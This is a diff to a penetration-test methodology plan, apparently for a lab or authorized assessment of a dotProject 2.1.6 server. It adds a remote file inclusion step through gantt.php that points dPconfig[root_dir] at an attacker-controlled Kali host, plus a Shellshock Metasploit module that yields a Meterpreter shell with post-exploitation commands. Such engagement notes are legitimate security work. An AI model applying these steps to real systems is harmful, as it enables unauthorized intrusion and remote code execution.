@@ -17,13 +17,14 @@
 - **`curl`** **`/`**, **`/dotproject/`**, **`index.php`** for version and redirects.
 - Optional **`nikto`**, **OWASP ZAP** (spider + active) — capture **Medium** items (e.g. **`login`** parameter tampering).
 
-## Phase 2 — Parallel “noise” lanes (deprioritize after negative check)
+## Phase 2 — Validated access (pick order by time-box)
 
-- **Shellshock / CGI** and generic **`searchsploit`** Apache/PHP rows — time-box; see [unfruitful log](../unfruitful_attempts/README.md) for **`check`** negatives and **RFI** listener mistakes.
+- **RFI:** **`searchsploit dotproject 2.1.6`** → **EDB-22708**; **`gantt.php`** + **`dPconfig[root_dir]=http://<KALI>:8080/...`** → body reflects **`PROOF`** (**`102-004`** in [`../Screenshots/`](../Screenshots/)).
+- **Shellshock (Meterpreter):** **`exploit/multi/http/apache_mod_cgi_bash_env_exec`** — a **`check`** on **`/cgi-bin/printenv`** may still say **not vulnerable**; **`run`** can succeed when **`TARGETURI`** hits a **real `mod_cgi`** script. Capture **`LHOST`** / handler port and post-ex (**`sysinfo`**, **`getuid`**, **`shell`**) — evidence **`102-009`**.
 
-## Phase 3 — Validated primitive (RFI)
+## Phase 3 — Generic catalogue (time-box)
 
-- **`searchsploit dotproject 2.1.6`** → **EDB-22708**; **`gantt.php`** + **`dPconfig[root_dir]=http://<KALI>:8080/...`** → body reflects **`PROOF`** (evidence **`102-004`** in [`../Screenshots/`](../Screenshots/)).
+- **`searchsploit`** Apache/PHP rows — background only; see [unfruitful log](../unfruitful_attempts/README.md).
 
 ## Phase 4 — Next bets
 
@@ -32,7 +33,7 @@
 
 ## Phase 5 — Reporting
 
-- Chain **EDB-22708** → **`102-004`** + ZAP **`102-005`** for the narrative; archive dead ends under [unfruitful log](../unfruitful_attempts/README.md).
+- Chain **EDB-22708** → **`102-004`**, ZAP **`102-005`**, and **Shellshock Meterpreter** **`102-009`** for the narrative; archive dead ends under [unfruitful log](../unfruitful_attempts/README.md).
 
 ---
 
